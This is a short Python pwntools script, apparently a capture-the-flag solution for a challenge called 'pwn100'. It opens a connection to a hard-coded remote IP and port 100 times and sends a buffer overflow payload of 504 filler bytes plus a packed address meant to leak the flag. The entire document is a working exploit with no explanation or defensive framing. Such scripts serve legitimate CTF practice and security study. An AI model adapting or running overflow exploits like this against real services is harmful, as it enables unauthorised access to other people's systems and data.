from pwn import *

context(log_level="debug")
flag_addr = 0x600DC0

#p  = process('./pwn100')

#gdb.attach(pidof(p)[0])
for x in range(100):
	p=remote('58.213.63.30',60001)
	p.recvuntil('he flag?\n')
	p.sendline('a'*504+p64(flag_addr))
	p.recvline()
	p.recvline()